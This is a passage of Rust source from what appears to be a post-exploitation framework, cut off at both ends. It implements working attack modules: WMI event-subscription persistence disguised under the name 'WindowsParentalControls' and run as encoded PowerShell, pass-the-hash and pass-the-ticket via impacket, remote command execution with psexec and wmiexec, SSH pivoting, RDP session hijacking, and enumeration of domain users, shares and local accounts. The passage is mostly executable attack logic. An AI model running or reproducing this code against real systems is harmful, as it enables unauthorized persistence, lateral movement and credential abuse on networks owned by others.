        target: config.target.clone(),
        success,
        findings,
        error: if !success { Some("Failed to add SSH key".to_string()) } else { None },
        timestamp: Utc::now(),
    })
}

async fn create_wmi_event_sub(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Create a WMI event subscription for persistence
    // Uses __EventFilter, CommandLineEventConsumer, and __FilterToConsumerBinding
    info!("Creating WMI event subscription on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Get subscription name
    let sub_name = config.options.get("name")
        .and_then(|v| v.as_str())
        .unwrap_or("WindowsParentalControls");

    // Get command to execute (required)
    let command = match config.options.get("command").and_then(|v| v.as_str()) {
        Some(c) => c,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::WmiEventSub,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("command option is required".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    // Get trigger type
    let trigger_type = config.options.get("trigger")
        .and_then(|v| v.as_str())
        .unwrap_or("startup"); // startup, logon, interval

    // Build WQL query based on trigger type
    let wql_query = match trigger_type {
        "logon" => {
            "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'".to_string()
        }
        "interval" => {
            let interval_sec = config.options.get("interval")
                .and_then(|v| v.as_u64())
                .unwrap_or(300); // default 5 minutes
            format!(
                "SELECT * FROM __InstanceModificationEvent WITHIN {} WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0",
                interval_sec
            )
        }
        _ => { // startup (default)
            "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320".to_string()
        }
    };

    // Build PowerShell commands to create WMI subscription
    let ps_script = format!(
        r#"
$FilterArgs = @{{
    Name = '{name}_Filter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "{query}"
}}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{{
    Name = '{name}_Consumer'
    CommandLineTemplate = '{command}'
}}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{{
    Filter = $Filter
    Consumer = $Consumer
}}
$Binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs

Write-Output "SUCCESS: WMI subscription created"
"#,
        name = sub_name,
        query = wql_query.replace("\"", "`\""),
        command = command.replace("'", "''")
    );

    // Execute the PowerShell script
    let encoded_script = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        ps_script.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>()
    );

    let ps_cmd = format!("powershell -EncodedCommand {}", encoded_script);

    let output = if is_local {
        Command::new("cmd")
            .args(["/c", &ps_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::WmiEventSub,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote WMI subscription".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        // Use wmiexec to run the PowerShell command
        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            ps_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(120),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    let success = if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if output.status.success() || stdout.contains("SUCCESS") {
            let mut details = HashMap::new();
            details.insert("subscription_name".to_string(), serde_json::json!(sub_name));
            details.insert("command".to_string(), serde_json::json!(command));
            details.insert("trigger_type".to_string(), serde_json::json!(trigger_type));
            details.insert("wql_query".to_string(), serde_json::json!(wql_query));
            details.insert("persistence_type".to_string(), serde_json::json!("wmi_event_subscription"));
            details.insert("components".to_string(), serde_json::json!([
                format!("{}_Filter", sub_name),
                format!("{}_Consumer", sub_name),
                "FilterToConsumerBinding"
            ]));
            details.insert("cleanup_command".to_string(), serde_json::json!(format!(
                "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object {{$_.Name -eq '{}_Filter'}} | Remove-WmiObject",
                sub_name
            )));

            findings.push(make_finding_with_details(
                "wmi_subscription_created",
                sub_name,
                details,
                Severity::Critical,
            ));
            true
        } else {
            false
        }
    } else {
        false
    };

    Ok(PostExploitResult {
        module: PostExploitModule::WmiEventSub,
        target: config.target.clone(),
        success,
        findings,
        error: if !success { Some("Failed to create WMI event subscription".to_string()) } else { None },
        timestamp: Utc::now(),
    })
}

// ============================================================================
// Lateral Movement
// ============================================================================

async fn pass_the_hash(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting Pass-the-Hash to {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for Pass-the-Hash"))?;

    let hash = creds.ntlm_hash.as_ref()
        .ok_or_else(|| anyhow!("NTLM hash required for Pass-the-Hash"))?;

    // Use smbexec.py or psexec.py with hash
    let domain = creds.domain.as_deref().unwrap_or(".");
    let creds_str = format!("{}/{}@{}", domain, creds.username, config.target);

    // Get command to execute (default: whoami)
    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    let result = tokio::time::timeout(
        Duration::from_secs(60),
        Command::new("smbexec.py")
            .args([
                &creds_str,
                "-hashes",
                &format!(":{}", hash),
                "-c",
                command,
            ])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let success = !combined.to_lowercase().contains("access denied") &&
                         !combined.to_lowercase().contains("logon_failure") &&
                         output.status.success();

            let mut findings = Vec::new();
            if success {
                findings.push(make_finding(
                    "pth_success",
                    &format!("{}@{}: {}", creds.username, config.target, stdout.trim()),
                    Severity::Critical,
                ));
            }

            info!("Pass-the-Hash {} for {}@{}",
                  if success { "succeeded" } else { "failed" },
                  creds.username, config.target);

            Ok(PostExploitResult {
                module: PostExploitModule::PassTheHash,
                target: config.target.clone(),
                success,
                findings,
                error: if success { None } else { Some(combined.chars().take(200).collect()) },
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheHash,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("smbexec.py not found: {}. Install: pip install impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheHash,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn pass_the_ticket(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting Pass-the-Ticket to {}", config.target);

    // Get ticket file path from options
    let ticket_file = config.options.get("ticket_file")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow!("ticket_file option required for Pass-the-Ticket"))?;

    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    // Use getST.py or ticketer.py to use the ticket
    let result = tokio::time::timeout(
        Duration::from_secs(60),
        Command::new("psexec.py")
            .env("KRB5CCNAME", ticket_file)
            .args([
                "-k",
                "-no-pass",
                &config.target,
                command,
            ])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let success = output.status.success();

            let mut findings = Vec::new();
            if success {
                findings.push(make_finding(
                    "ptt_success",
                    &format!("{}:{}", config.target, stdout.trim()),
                    Severity::Critical,
                ));
            }

            Ok(PostExploitResult {
                module: PostExploitModule::PassTheTicket,
                target: config.target.clone(),
                success,
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheTicket,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("Failed: {}", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::PassTheTicket,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn psexec(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting PsExec to {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for PsExec"))?;

    let creds_str = build_impacket_creds(&creds, &config.target);

    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    let mut args = vec![creds_str];
    if let Some(ref hash) = creds.ntlm_hash {
        if creds.password.is_none() {
            args.push("-hashes".to_string());
            args.push(format!(":{}", hash));
        }
    }
    args.push("-c".to_string());
    args.push(command.to_string());

    let result = tokio::time::timeout(
        Duration::from_secs(90),
        Command::new("psexec.py")
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let success = !combined.to_lowercase().contains("access denied") &&
                         !combined.to_lowercase().contains("error") &&
                         (stdout.contains("Windows") || stdout.lines().count() > 0);

            let mut findings = Vec::new();
            if success {
                findings.push(make_finding(
                    "psexec_success",
                    &format!("{}@{}: {}", creds.username, config.target, stdout.trim()),
                    Severity::Critical,
                ));
            }

            info!("PsExec {} for {}@{}",
                  if success { "succeeded" } else { "failed" },
                  creds.username, config.target);

            Ok(PostExploitResult {
                module: PostExploitModule::PsExec,
                target: config.target.clone(),
                success,
                findings,
                error: if success { None } else { Some(combined.chars().take(200).collect()) },
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::PsExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("psexec.py not found: {}. Install: pip install impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::PsExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn wmiexec(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting WMI execution on {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for WMI execution"))?;

    let creds_str = build_impacket_creds(&creds, &config.target);

    let command = config.options.get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("whoami");

    let mut args = vec![creds_str];
    if let Some(ref hash) = creds.ntlm_hash {
        if creds.password.is_none() {
            args.push("-hashes".to_string());
            args.push(format!(":{}", hash));
        }
    }
    args.push(command.to_string());

    let result = tokio::time::timeout(
        Duration::from_secs(60),
        Command::new("wmiexec.py")
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let success = !combined.to_lowercase().contains("access denied") &&
                         output.status.success();

            let mut findings = Vec::new();
            if success {
                let mut details = HashMap::new();
                details.insert("target".to_string(), serde_json::json!(config.target));
                details.insert("user".to_string(), serde_json::json!(creds.username));
                details.insert("output".to_string(), serde_json::json!(stdout.trim()));
                findings.push(make_finding_with_details(
                    "wmiexec_success",
                    &format!("{}@{}", creds.username, config.target),
                    details,
                    Severity::Critical,
                ));
            }

            Ok(PostExploitResult {
                module: PostExploitModule::WmiExec,
                target: config.target.clone(),
                success,
                findings,
                error: if success { None } else { Some(combined.chars().take(200).collect()) },
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::WmiExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("wmiexec.py not found: {}", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::WmiExec,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn ssh_pivot(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Setting up SSH pivot through {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for SSH pivot"))?;

    // Get pivot configuration
    let local_port = config.options.get("local_port")
        .and_then(|v| v.as_u64())
        .unwrap_or(1080) as u16;

    let remote_host = config.options.get("remote_host")
        .and_then(|v| v.as_str())
        .unwrap_or("127.0.0.1");

    let remote_port = config.options.get("remote_port")
        .and_then(|v| v.as_u64())
        .unwrap_or(22) as u16;

    // Setup SSH tunnel: ssh -D local_port user@target (SOCKS proxy)
    // or: ssh -L local_port:remote_host:remote_port user@target (port forward)
    let tunnel_type = config.options.get("tunnel_type")
        .and_then(|v| v.as_str())
        .unwrap_or("socks"); // "socks" or "forward"

    let tunnel_arg = if tunnel_type == "socks" {
        format!("-D {}", local_port)
    } else {
        format!("-L {}:{}:{}", local_port, remote_host, remote_port)
    };

    info!("SSH pivot: {} via {}@{}", tunnel_arg, creds.username, config.target);

    // For actual pivot, we'd need to keep the SSH session running
    // This just validates the connection would work
    let mut args = vec![
        "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(), "BatchMode=yes".to_string(),
        "-o".to_string(), "ConnectTimeout=10".to_string(),
    ];

    if let Some(ref password) = creds.password {
        // Use sshpass for password auth
        args.insert(0, password.clone());
        args.insert(0, "-p".to_string());
    }

    args.push(format!("{}@{}", creds.username, config.target));
    args.push("echo".to_string());
    args.push("pivot_test".to_string());

    let cmd = if creds.password.is_some() { "sshpass" } else { "ssh" };

    let result = tokio::time::timeout(
        Duration::from_secs(30),
        Command::new(cmd)
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let success = stdout.contains("pivot_test") || output.status.success();

            let mut findings = Vec::new();
            if success {
                let mut details = HashMap::new();
                details.insert("target".to_string(), serde_json::json!(config.target));
                details.insert("tunnel_type".to_string(), serde_json::json!(tunnel_type));
                details.insert("local_port".to_string(), serde_json::json!(local_port));
                details.insert("command".to_string(), serde_json::json!(format!("ssh {} {}@{}", tunnel_arg, creds.username, config.target)));
                findings.push(make_finding_with_details(
                    "ssh_pivot_ready",
                    &format!("{}@{} on port {}", creds.username, config.target, local_port),
                    details,
                    Severity::High,
                ));
            }

            Ok(PostExploitResult {
                module: PostExploitModule::SshPivot,
                target: config.target.clone(),
                success,
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::SshPivot,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("SSH failed: {}", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::SshPivot,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Connection timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn rdp_hijack(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting RDP session hijack on {}", config.target);

    // RDP hijacking requires SYSTEM privileges and uses tscon.exe
    // This is a placeholder - real implementation requires being on the target

    let creds = config.credentials.as_ref();

    // Get session ID to hijack
    let session_id = config.options.get("session_id")
        .and_then(|v| v.as_u64());

    if session_id.is_none() {
        let mut details = HashMap::new();
        details.insert("message".to_string(), serde_json::json!("To hijack RDP sessions, first enumerate sessions with 'query session' then specify session_id option"));
        details.insert("command_template".to_string(), serde_json::json!("tscon <SESSION_ID> /dest:console"));
        return Ok(PostExploitResult {
            module: PostExploitModule::RdpHijack,
            target: config.target.clone(),
            success: false,
            findings: vec![make_finding_with_details(
                "rdp_info",
                "session_id required",
                details,
                Severity::Low,
            )],
            error: Some("session_id option required".to_string()),
            timestamp: Utc::now(),
        });
    }

    // If we have creds, try to execute remotely
    if let Some(creds) = creds {
        let creds_str = build_impacket_creds(&creds, &config.target);
        let cmd = format!("tscon {} /dest:console", session_id.unwrap());

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("wmiexec.py")
                .args([&creds_str, &cmd])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let success = output.status.success();
                let mut details = HashMap::new();
                details.insert("session_id".to_string(), serde_json::json!(session_id));
                details.insert("result".to_string(), serde_json::json!(if success { "success" } else { "failed" }));
                Ok(PostExploitResult {
                    module: PostExploitModule::RdpHijack,
                    target: config.target.clone(),
                    success,
                    findings: vec![make_finding_with_details(
                        "rdp_hijack_attempt",
                        &format!("session {} on {}", session_id.unwrap_or(0), config.target),
                        details,
                        if success { Severity::Critical } else { Severity::Medium },
                    )],
                    error: None,
                    timestamp: Utc::now(),
                })
            }
            _ => Ok(PostExploitResult {
                module: PostExploitModule::RdpHijack,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("Execution failed".to_string()),
                timestamp: Utc::now(),
            }),
        }
    } else {
        Ok(PostExploitResult {
            module: PostExploitModule::RdpHijack,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Credentials required for remote RDP hijack".to_string()),
            timestamp: Utc::now(),
        })
    }
}

// ============================================================================
// Discovery
// ============================================================================

async fn enumerate_network_shares(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Enumerate SMB shares on the target using net view or smbclient
    info!("Enumerating network shares on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Determine if Windows or Linux and run appropriate command
    let shares_output = if is_local {
        // Try Windows net share first
        let win_output = Command::new("cmd")
            .args(["/c", "net share 2>nul"])
            .output()
            .await;

        if let Ok(ref output) = win_output {
            if output.status.success() && !output.stdout.is_empty() {
                win_output
            } else {
                // Try Linux/Samba - list shares from smb.conf
                Command::new("sh")
                    .args(["-c", "grep -E '^\\[' /etc/samba/smb.conf 2>/dev/null | grep -v '\\[global\\]' || cat /etc/exports 2>/dev/null"])
                    .output()
                    .await
            }
        } else {
            win_output
        }
    } else {
        // Remote enumeration via smbclient
        let creds = config.credentials.as_ref();
        let creds_args = if let Some(c) = creds {
            if let Some(ref pwd) = c.password {
                format!("-U '{}%{}'", c.username, pwd)
            } else {
                format!("-U '{}' -N", c.username)
            }
        } else {
            "-N".to_string()
        };

        tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("sh")
                .args(["-c", &format!("smbclient -L {} {} 2>/dev/null", config.target, creds_args)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = shares_output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse Windows net share output
        for line in stdout.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with("Share") || line.starts_with("---") || line.contains("command completed") {
                continue;
            }

            // Parse share name and path
            let parts: Vec<&str> = line.split_whitespace().collect();
            if !parts.is_empty() {
                let share_name = parts[0];

                // Skip system shares unless specifically looking for them
                let is_admin_share = share_name.ends_with('$');

                let mut details = HashMap::new();
                details.insert("share_name".to_string(), serde_json::json!(share_name));
                if parts.len() > 1 {
                    details.insert("path".to_string(), serde_json::json!(parts[1..].join(" ")));
                }
                details.insert("is_admin_share".to_string(), serde_json::json!(is_admin_share));
                details.insert("discovery_type".to_string(), serde_json::json!("network_share"));

                findings.push(make_finding_with_details(
                    "network_share",
                    share_name,
                    details,
                    if is_admin_share { Severity::High } else { Severity::Info },
                ));
            }
        }

        // Parse smbclient output (for remote targets)
        if stdout.contains("Sharename") {
            let mut in_shares = false;
            for line in stdout.lines() {
                if line.contains("Sharename") {
                    in_shares = true;
                    continue;
                }
                if in_shares && line.starts_with("---") {
                    continue;
                }
                if in_shares && line.trim().is_empty() {
                    break;
                }
                if in_shares {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if !parts.is_empty() {
                        let share_name = parts[0];
                        let share_type = parts.get(1).copied().unwrap_or("");

                        let mut details = HashMap::new();
                        details.insert("share_name".to_string(), serde_json::json!(share_name));
                        details.insert("type".to_string(), serde_json::json!(share_type));
                        if parts.len() > 2 {
                            details.insert("description".to_string(), serde_json::json!(parts[2..].join(" ")));
                        }

                        findings.push(make_finding_with_details(
                            "smb_share",
                            share_name,
                            details,
                            Severity::Info,
                        ));
                    }
                }
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::NetworkShares,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}

async fn enumerate_domain_users(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Enumerate domain users via LDAP, net commands, or rpcclient
    info!("Enumerating domain users from {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Build enumeration commands
    let users_output = if is_local {
        // Windows: net user /domain
        Command::new("cmd")
            .args(["/c", "net user /domain 2>nul"])
            .output()
            .await
    } else {
        let creds = config.credentials.as_ref();

        // Try rpcclient for anonymous/authenticated enumeration
        let rpc_cmd = if let Some(c) = creds {
            format!(
                "rpcclient -U '{}%{}' {} -c 'enumdomusers' 2>/dev/null",
                c.username,
                c.password.as_deref().unwrap_or(""),
                config.target
            )
        } else {
            format!(
                "rpcclient -U '' -N {} -c 'enumdomusers' 2>/dev/null",
                config.target
            )
        };

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("sh")
                .args(["-c", &rpc_cmd])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = users_output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse Windows net user /domain output
        if stdout.contains("User accounts for") || stdout.contains("---") {
            let mut in_users = false;
            for line in stdout.lines() {
                if line.contains("---") {
                    in_users = true;
                    continue;
                }
                if in_users && (line.starts_with("The command") || line.trim().is_empty()) {
                    continue;
                }
                if in_users {
                    // Users are listed in columns
                    for user in line.split_whitespace() {
                        if !user.is_empty() {
                            let mut details = HashMap::new();
                            details.insert("username".to_string(), serde_json::json!(user));
                            details.insert("type".to_string(), serde_json::json!("domain_user"));
                            details.insert("discovery_type".to_string(), serde_json::json!("domain_enumeration"));

                            findings.push(make_finding_with_details(
                                "domain_user",
                                user,
                                details,
                                Severity::Info,
                            ));
                        }
                    }
                }
            }
        }

        // Parse rpcclient enumdomusers output
        // Format: user:[username] rid:[0x...]
        for line in stdout.lines() {
            if line.starts_with("user:[") {
                if let Some(user_start) = line.find("user:[") {
                    if let Some(user_end) = line[user_start + 6..].find(']') {
                        let username = &line[user_start + 6..user_start + 6 + user_end];

                        // Extract RID if present
                        let rid = if let Some(rid_start) = line.find("rid:[") {
                            line[rid_start + 5..].find(']')
                                .map(|end| &line[rid_start + 5..rid_start + 5 + end])
                        } else {
                            None
                        };

                        let mut details = HashMap::new();
                        details.insert("username".to_string(), serde_json::json!(username));
                        if let Some(rid_val) = rid {
                            details.insert("rid".to_string(), serde_json::json!(rid_val));
                        }
                        details.insert("type".to_string(), serde_json::json!("domain_user"));
                        details.insert("discovery_type".to_string(), serde_json::json!("rpc_enumeration"));

                        findings.push(make_finding_with_details(
                            "domain_user",
                            username,
                            details,
                            Severity::Info,
                        ));
                    }
                }
            }
        }
    }

    // Also try to enumerate domain groups if users found
    if !findings.is_empty() && !is_local {
        let creds = config.credentials.as_ref();
        let groups_cmd = if let Some(c) = creds {
            format!(
                "rpcclient -U '{}%{}' {} -c 'enumdomgroups' 2>/dev/null",
                c.username,
                c.password.as_deref().unwrap_or(""),
                config.target
            )
        } else {
            format!(
                "rpcclient -U '' -N {} -c 'enumdomgroups' 2>/dev/null",
                config.target
            )
        };

        if let Ok(output) = Command::new("sh").args(["-c", &groups_cmd]).output().await {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                if line.starts_with("group:[") {
                    if let Some(grp_start) = line.find("group:[") {
                        if let Some(grp_end) = line[grp_start + 7..].find(']') {
                            let groupname = &line[grp_start + 7..grp_start + 7 + grp_end];

                            let mut details = HashMap::new();
                            details.insert("group_name".to_string(), serde_json::json!(groupname));
                            details.insert("type".to_string(), serde_json::json!("domain_group"));

                            findings.push(make_finding_with_details(
                                "domain_group",
                                groupname,
                                details,
                                if groupname.contains("Admin") { Severity::High } else { Severity::Info },
                            ));
                        }
                    }
                }
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::DomainUsers,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}

async fn enumerate_local_users(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Enumerate local users on the target system
    info!("Enumerating local users on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Windows: net user, Linux: cat /etc/passwd
    let win_cmd = "net user 2>nul";
    let linux_cmd = "cat /etc/passwd 2>/dev/null";

    let output = if is_local {
        // Try Windows first
        let win_output = Command::new("cmd")
            .args(["/c", win_cmd])
            .output()
            .await;

        if let Ok(ref output) = win_output {
            if output.status.success() && output.stdout.len() > 50 {
                win_output
            } else {
                Command::new("sh")
                    .args(["-c", linux_cmd])
                    .output()
                    .await
            }
        } else {
            Command::new("sh")
                .args(["-c", linux_cmd])
                .output()
                .await
        }
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::LocalUsers,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote user enumeration".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        // Try SSH for Linux
        let ssh_cmd = format!(
            "sshpass -p '{}' ssh -o StrictHostKeyChecking=no {}@{} '{}'",
            creds.password.as_deref().unwrap_or(""),
            creds.username,
            config.target,
            linux_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("sh")
                .args(["-c", &ssh_cmd])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse Windows net user output
        if stdout.contains("User accounts for") {
            let mut in_users = false;
            for line in stdout.lines() {
                if line.contains("---") {
                    in_users = true;
                    continue;
                }
                if in_users && (line.starts_with("The command") || line.trim().is_empty()) {
                    continue;
                }
                if in_users {
                    for user in line.split_whitespace() {
                        if !user.is_empty() {
                            let mut details = HashMap::new();
                            details.insert("username".to_string(), serde_json::json!(user));
                            details.insert("type".to_string(), serde_json::json!("local_user"));
                            details.insert("os".to_string(), serde_json::json!("windows"));

                            findings.push(make_finding_with_details(
                                "local_user",
                                user,
                                details,
                                Severity::Info,
                            ));
                        }
                    }
                }
            }
        }

        // Parse Linux /etc/passwd
        if stdout.contains(':') && !stdout.contains("User accounts") {
            for line in stdout.lines() {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 7 {
                    let username = parts[0];
                    let uid: u32 = parts[2].parse().unwrap_or(65534);
                    let gid: u32 = parts[3].parse().unwrap_or(65534);
                    let home = parts[5];
                    let shell = parts[6];

                    // Determine if this is a regular user, system user, or service account
                    let user_type = if uid == 0 {
                        "root"
                    } else if uid < 1000 {
                        "system"
                    } else {
                        "regular"
                    };

                    let has_login = !shell.ends_with("nologin") && !shell.ends_with("false");

                    let mut details = HashMap::new();
                    details.insert("username".to_string(), serde_json::json!(username));
                    details.insert("uid".to_string(), serde_json::json!(uid));
                    details.insert("gid".to_string(), serde_json::json!(gid));
                    details.insert("home".to_string(), serde_json::json!(home));
                    details.insert("shell".to_string(), serde_json::json!(shell));
                    details.insert("user_type".to_string(), serde_json::json!(user_type));
                    details.insert("has_login".to_string(), serde_json::json!(has_login));
                    details.insert("os".to_string(), serde_json::json!("linux"));

                    let severity = if uid == 0 {
                        Severity::High
                    } else if has_login && uid >= 1000 {
                        Severity::Medium
                    } else {
                        Severity::Info
                    };

                    findings.push(make_finding_with_details(
                        "local_user",
                        username,
                        details,
                        severity,
                    ));
                }
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::LocalUsers,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}

async fn enumerate_installed_software(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Enumerate installed software for vulnerability assessment
    info!("Enumerating installed software on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Windows: wmic or PowerShell, Linux: dpkg/rpm/pacman
    let win_cmd = "wmic product get name,version 2>nul";
    let linux_cmd = "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null || pacman -Q 2>/dev/null || apk list --installed 2>/dev/null";

    let output = if is_local {
        let win_output = Command::new("cmd")
            .args(["/c", win_cmd])
            .output()
            .await;

        if let Ok(ref output) = win_output {
            if output.status.success() && output.stdout.len() > 50 {
                win_output
            } else {
                Command::new("sh")
                    .args(["-c", linux_cmd])
                    .output()
                    .await
            }
        } else {
            Command::new("sh")
                .args(["-c", linux_cmd])
